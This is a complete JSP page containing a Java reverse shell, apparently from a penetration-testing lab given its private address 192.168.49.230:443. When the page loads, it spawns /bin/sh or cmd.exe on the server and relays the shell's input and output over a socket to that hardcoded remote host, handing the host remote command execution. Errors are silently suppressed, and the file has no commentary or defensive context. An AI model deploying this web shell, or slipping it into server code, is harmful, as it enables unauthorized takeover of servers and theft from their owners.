<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream np;
    OutputStream us;

    StreamConnector( InputStream np, OutputStream us )
    {
      this.np = np;
      this.us = us;
    }

    public void run()
    {
      BufferedReader wh  = null;
      BufferedWriter nqa = null;
      try
      {
        wh  = new BufferedReader( new InputStreamReader( this.np ) );
        nqa = new BufferedWriter( new OutputStreamWriter( this.us ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = wh.read( buffer, 0, buffer.length ) ) > 0 )
        {
          nqa.write( buffer, 0, length );
          nqa.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( wh != null )
          wh.close();
        if( nqa != null )
          nqa.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.49.230", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
